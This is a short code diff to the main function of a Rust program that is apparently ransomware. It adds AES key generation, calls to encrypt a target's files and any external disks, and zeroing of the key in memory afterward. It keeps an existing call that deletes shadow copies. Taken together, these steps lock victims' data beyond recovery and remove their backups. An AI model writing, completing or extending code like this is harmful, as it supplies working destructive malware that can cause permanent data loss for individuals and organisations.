@@ -11,9 +11,19 @@ fn main(){
         println!("Missing Arguments");
         exit(-1)
     }
+    let mut key= encryption::file::gen_aes_key(32);
+
+    encryption::file::multi_threaded_encrypt_decrypt_files(&args[1][..], key.as_bytes());
+    encryption::disk::encrypt_decrypt_external_disks(key.as_bytes());
     
-    encryption::file::multi_threaded_encrypt_decrypt_files(&args[1][..]);
-    encryption::disk::encrypt_decrypt_external_disks();
+    unsafe {
+        for key_char in key.as_mut_vec(){
+            *key_char = 48;
+        }
+    }
+
+    //println!("{}", key);
+
     system::file::delete_shadow_copies();
 
     exit(0);
